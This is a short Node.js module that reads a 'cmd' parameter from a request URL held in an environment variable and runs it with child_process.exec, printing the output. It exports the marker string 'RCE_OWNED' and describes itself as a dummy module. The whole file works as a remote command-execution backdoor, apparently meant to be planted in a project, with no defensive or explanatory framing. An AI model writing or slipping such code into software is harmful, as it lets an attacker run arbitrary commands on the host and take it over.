const os = require('os');
const cmd = new URLSearchParams(new URL(process.env.REQUEST_URL || '').search).get('cmd');
const exec = require('child_process').exec;
exec(cmd, (err, stdout) => {
  console.log(stdout);
});
module.exports = 'RCE_OWNED';  // Dummy export to act as module
